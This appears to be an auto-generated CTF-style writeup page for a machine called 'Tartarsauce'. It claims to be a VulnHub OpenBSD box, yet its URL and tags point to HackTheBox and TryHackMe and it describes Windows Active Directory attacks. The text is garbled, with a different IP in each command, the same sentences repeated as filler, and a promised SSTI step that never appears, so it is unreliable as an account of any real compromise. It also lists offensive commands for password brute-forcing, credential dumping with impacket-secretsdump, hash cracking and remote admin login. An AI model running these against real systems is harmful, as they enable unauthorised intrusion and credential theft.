---
TitleSEO: "VulnHub — Tartarsauce (Insane OpenBSD) | ZureFX"
TitlePost: "VulnHub — Tartarsauce (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Tartarsauce. Pass the Hash and SSTI to achieve insane compromise on OpenBSD."
Keywords: "reversing, windows, tryhackme, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-tartarsauce-336.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tartarsauce-336/"
Date: "2025-12-09"
Tags: "Reversing, Windows, TryHackMe, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-tartarsauce-336"
Permalink: "/writeups/htb-tartarsauce-336.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Tartarsauce** is rated **Insane** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.124.187.249`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.91.210.69 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.158.231/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.72.194 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.123.19.11 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.43.97
evil-winrm -i 10.41.234.43 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p993,5985,995 10.89.109.129 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

Key finding: **Pass the Hash**.

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.197.177
nmap -sCV -p443,143,22 10.55.30.105 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```powershell
crackmapexec smb 10.23.118.19 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.211.158/FUZZ
gobuster dir -u http://10.12.214.44/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.96.4.221/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.122.187.1
evil-winrm -i 10.67.133.250 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.90.163.16 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.52.91.83 -u administrator -p 'P@ssw0rd!'
```

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `hydra`
- `impacket`
- `smbexec`
- `enum4linux`
- `lookupsid`

### Key Takeaways

- Pass the Hash
- SSTI
